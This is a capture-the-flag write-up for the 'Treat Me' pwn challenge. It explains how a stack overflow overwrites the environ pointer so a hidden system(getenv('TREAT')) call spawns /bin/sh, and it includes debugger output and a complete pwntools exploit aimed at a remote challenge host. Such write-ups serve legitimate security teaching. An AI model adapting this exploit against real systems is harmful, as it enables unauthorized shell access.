# Treat Me

#### Category: pwn
#### Points: 200

Let's, check the binary.
```
$ checksec ./treat
[*] '/home/vn-ki/ctf/inferno/treat/treat'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Reversing the binary, we see there are 3 inputs.

1. Our name, stored in `.bss`, i.e. we know the address of this without leaking.
2. Choice, this is a buffer on the stack.
3. Feedback, this is the same buffer as 2.

All the inputs are taken using a custom function which will terminate the input at null and newline.

I initally thought of a ret2plt, but the null characters will be a problem.

Inspecting more we discover another function.

```c
void FUN_00401186(void)
{
  char *__command;

  puts("You want some special treat?\nHere you go");
  __command = getenv("TREAT");
  system(__command);
  return;
}
```

Well, well, well, what do we have here.

This function calls system on the environment variable TREAT.

The attack vector is quite clear now. Overwrite the environment variables on the stack to point to TREAT=/bin/sh.

For that we have to find how far away the first environment variable is.
```
pwndbg> x/gx (char **)environ
0x7fffffffdea8: 0x00007fffffffe212
pwndbg> distance 0x7fffffffddb8 0x7fffffffdea8
0x7fffffffddb8->0x7fffffffdea8 is 0xf0 bytes (0x1e words)
```

So we will overwrite the first pointer at environ to point to our name in the `.bss` and call the function.

So our inputs will be used like:

1. Name will be `TREAT=/bin/sh`
2. Our second input will be garbage of length 72 + 0xf0 = 0x138 (72 is the distance from buffer to RIP) and the adresss of input 1.
3. Using our third overflow, we will control the RIP.

The full exploit,

```python
from pwn import *

binary = './treat'
context.arch = 'amd64'

# p = process(binary)
p = remote('130.211.214.112', 18010)
# gdb.attach(p, 'b *0x0040162c')
p = gdb.debug(binary, 'b *0x0040162c')

p.sendline("TREAT=/bin/sh")

p.sendline('A'*0x138 + '\x80\x50\x40')
p.sendline('A' * 72 + p64(0x00401186))
p.interactive()
```
